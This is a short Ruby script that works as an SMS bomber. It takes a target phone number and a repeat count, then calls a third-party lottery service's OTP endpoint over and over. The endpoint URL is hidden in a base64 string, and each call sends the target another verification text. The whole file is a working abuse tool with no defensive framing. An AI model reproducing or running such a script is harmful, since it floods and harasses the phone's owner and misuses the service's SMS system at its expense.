require 'net/http'
require 'uri'
require 'base64'

def send_get_request(phone_number)
  base64_url = "aHR0cHM6Ly9sb3R0ZXJ5LWFwaXMtenFta2tscDViYS1lbS5hLnJ1bi5hcHAvc2VuZE9UUC8/cGhvbmU9"
  full_url = "#{Base64.decode64(base64_url)}#{phone_number}"
  response = Net::HTTP.get(URI(full_url))
  puts response
end

if ARGV.length != 2
  puts "Usage: ruby sender.rb <phone_number> <iteration_count>"
  exit 1
end

phone_number = ARGV[0]
iteration_count = ARGV[1].to_i

iteration_count.times do |i|
  puts "Sending SMS #{i + 1}:"
  send_get_request(phone_number)
end
